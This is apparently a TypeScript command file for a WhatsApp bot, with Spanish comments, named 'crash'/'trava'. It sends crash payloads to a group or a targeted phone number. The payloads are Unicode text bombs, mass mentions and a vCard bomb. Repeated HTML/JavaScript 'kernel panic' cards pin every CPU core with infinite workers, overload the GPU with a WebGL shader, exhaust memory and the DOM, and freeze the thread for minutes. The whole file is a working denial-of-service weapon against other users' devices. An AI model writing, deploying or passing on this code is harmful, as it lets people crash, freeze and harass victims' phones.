import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── generadores de texto ───────────────────────── */

const CGJ = "\u034f";
const ZW = "\u200b\u200c\u200d\u2060\ufeff";
const RTL = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";

const cgj = (n: number) => CGJ.repeat(n);
const zw = (n: number) => {
  let o = "";
  for (let i = 0; i < n; i++) o += ZW[i % 5] + RTL[i % 10];
  return o;
};

const textBomb = (lv: number) =>
  "☢️ " + cgj(20000 * lv) + "\n\n" + "🎉".repeat(9000 * lv) + "\n\n" + zw(4000 * lv) + "\n\n" + "█".repeat(3000 * lv);

/* ───────────────────────── payload: CPU + GPU + OOM ───────────────────────── */

function buildKernelPanic(name: string, lv: number) {
  const cores = 2 * lv;            // multiplicador de workers
  const mb = 3 * lv;               // MB por string
  const blocks = 35 * lv;          // nº de strings
  const nodes = 35000 * lv;        // nodos de DOM
  const iter = 3000 + 1500 * lv;   // iteraciones del shader

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
#g{position:absolute;z-index:10;left:0;right:0;top:0;background:rgba(0,0,0,.82);padding:12px;border-bottom:2px solid #0ff}
h2{margin:0 0 8px;color:#0ff;text-align:center;font-size:15px;letter-spacing:2px}
.st{display:flex;justify-content:space-between;font-size:11px;color:#9ff}
.st b{color:#0ff;font-size:15px}
#s{margin-top:6px;font-family:monospace;font-size:9px;color:#0ff}
canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
</style>
<div id="g">
  <h2>🌌 KERNEL PANIC 🌌</h2>
  <div class="st"><div>NÚCLEOS<br><b id="c">0</b></div><div>FPS<br><b id="f">0</b></div></div>
  <div id="s">fase 0</div>
</div>
<canvas id="cv"></canvas>
<script>
var cv=document.getElementById('cv'),fEl=document.getElementById('f'),cEl=document.getElementById('c'),sEl=document.getElementById('s');
var cores=navigator.hardwareConcurrency||8, pool=[], fr=0, lf=0, hoard=[];
cEl.textContent=cores;
function fase(n){try{sEl.textContent='fase '+n}catch(e){}}
function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,16)})}catch(e){setTimeout(fn,16)}}

/* 1 · todos los núcleos, bucle infinito, doble tanda */
fase(1);
try{
  var src='onmessage=function(){var v=0;while(true){v+=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(v+1);}}';
  var u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
  for(var i=0;i<cores*${cores};i++){var w=new Worker(u);w.postMessage(1);pool.push(w)}
}catch(e){try{sEl.textContent='workers bloqueados'}catch(x){}}

next(function(){
  /* 2 · GPU: shader pesado a pantalla completa */
  fase(2);
  try{
    cv.width=Math.min(window.innerWidth||420,720);
    cv.height=Math.min(window.innerHeight||900,1400);
    var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
    if(!gl)throw 0;
    gl.viewport(0,0,cv.width,cv.height);
    var vs=gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
    gl.compileShader(vs);
    var fs=gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.25;'+
      'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
      'for(int i=0;i<${iter};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
      'if(dot(z,z)>4.)break;it++;}'+
      'float k=it/${iter}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
    gl.compileShader(fs);
    var pr=gl.createProgram();
    gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
    var b=gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER,b);
    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
    var pos=gl.getAttribLocation(pr,'p');
    gl.enableVertexAttribArray(pos);
    gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
    var uT=gl.getUniformLocation(pr,'t'),uR=gl.getUniformLocation(pr,'r');
    (function loop(now){
      fr++;
      if(now-lf>=1000){try{fEl.textContent=fr}catch(e){}fr=0;lf=now}
      gl.uniform1f(uT,now*0.001);
      gl.uniform2f(uR,cv.width,cv.height);
      gl.drawArrays(gl.TRIANGLES,0,6);
      requestAnimationFrame(loop);
    })(0);
  }catch(e){try{sEl.textContent='GPU bloqueada'}catch(x){}}
  next(fase3);
});

/* 3 · memoria */
function fase3(){
  fase(3);
  try{for(var i=0;i<${blocks};i++)hoard.push('█'.repeat(${mb}*1000000))}catch(e){}
  next(fase4);
}

/* 4 · DOM */
function fase4(){
  fase(4);
  try{
    var frag=document.createDocumentFragment();
    for(var i=0;i<${nodes};i++){var d=document.createElement('div');d.textContent='█'.repeat(200)+Math.random();frag.appendChild(d)}
    document.body.appendChild(frag);
  }catch(e){}
  next(fase5);
}

/* 5 · historial + bloqueo del hilo (ANR) */
function fase5(){
  fase(5);
  try{for(var i=0;i<2000;i++)history.pushState({i:i},'','#p'+i)}catch(e){}
  fase(6);
  var t0=Date.now();
  while(true){if(Date.now()-t0>900000)break}
}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── vCard bomb ───────────────────────── */

function buildContacts(count: number, lv: number) {
  const heavy = cgj(2500 * lv) + zw(500 * lv);
  const list = [];
  for (let i = 0; i < count; i++) {
    const n = `000000${i}`.slice(-6);
    list.push({
      vcard:
        `BEGIN:VCARD\nVERSION:3.0\nFN:${heavy}${n}\nN:${n};${heavy};;;\n` +
        `TEL;type=CELL;waid=52155${n}:+52155${n}\nEND:VCARD`,
    });
  }
  return { displayName: `☢️ ${heavy.slice(0, 1400)}`, contacts: list };
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  description: "Kernel panic: workers al 100%, shader WebGL, OOM de WebView, CGJ y vCards. Grupo por defecto; con mención va al privado en ráfaga.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const ctxInfo: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const mentioned: string[] = ctxInfo.mentionedJid || [];
    const quoted: string | undefined = ctxInfo.participant;
    const sender: string = (msg.key as any).participant || from;

    const a0 = (args[0] || "").trim();
    const raw = a0.replace(/\D/g, "");
    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;

    /* destino: mención > número escrito > citado > grupo */
    let targets: string[];
    let toPrivate: boolean;

    if (mentioned.length) {
      targets = mentioned;
      toPrivate = true;
    } else if (raw.length >= 8) {
      targets = [`${raw}@s.whatsapp.net`];
      toPrivate = true;
    } else if (quoted) {
      targets = [quoted];
      toPrivate = true;
    } else {
      targets = [from];
      toPrivate = false;
    }

    await react("☢️").catch(() => undefined);

    const done: string[] = [];

    const push = async (label: string, fn: () => Promise<any>) => {
      try { await fn(); done.push(`✅ ${label}`); }
      catch (e: any) { done.push(`⚠️ ${label}: ${e?.message || e}`); }
    };

    const card = async (jid: string, name: string, level: number) => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("☢️ KERNEL PANIC // LuferOS")
        .setFooter(`nivel ${level} · no cierres la tarjeta`);
      rich.addSection(buildKernelPanic(name, level));
      return rich.send(jid);
    };

    for (const t of targets) {
      const isGroup = t.endsWith("@g.us");
      const num = t.split("@")[0].split(":")[0];

      let name = num;
      try {
        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
        else name = String((msg as any).pushName || "").trim() || num;
      } catch {}

      const q = isGroup ? { quoted: msg } : undefined;

      /* texto CGJ + emoji */
      await push(`texto ${num}`, () => sock.sendMessage(t, { text: textBomb(lv) }, q));

      /* mención masiva */
      await push(`menciones ${num}`, () =>
        sock.sendMessage(t, {
          text: `@${num} `.repeat(600 * lv).trim(),
          mentions: Array(600 * lv).fill(isGroup ? sender : t),
        }, q));

      /* vCard bomb */
      await push(`vcards ${num}`, () => sock.sendMessage(t, { contacts: buildContacts(50 * lv, lv) }, q));

      /* ráfaga de kernel panic: varias tarjetas si es privado */
      const cards = toPrivate ? 3 + lv : 1;
      for (let i = 1; i <= cards; i++) {
        await push(`panic ${num} #${i}`, () => card(t, name, lv));
        await sleep(toPrivate ? 350 : 0);
      }

      /* reapertura: segunda ronda */
      if (lv >= 3 && toPrivate) {
        await sleep(400);
        await push(`texto x2 ${num}`, () => sock.sendMessage(t, { text: textBomb(3) }));
        await push(`panic final ${num}`, () => card(t, name, 3));
      }
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Kernel panic enviado")} → ${toPrivate ? targets.map((t) => `@${t.split("@")[0]}`).join(" ") : "este grupo"}\n` +
        `Nivel: ${lv} · tarjetas: ${toPrivate ? 3 + lv : 1}\n\n${done.slice(0, 14).join("\n")}`,
      { mentions: targets } as any,
    ).catch(() => undefined);
  },
};
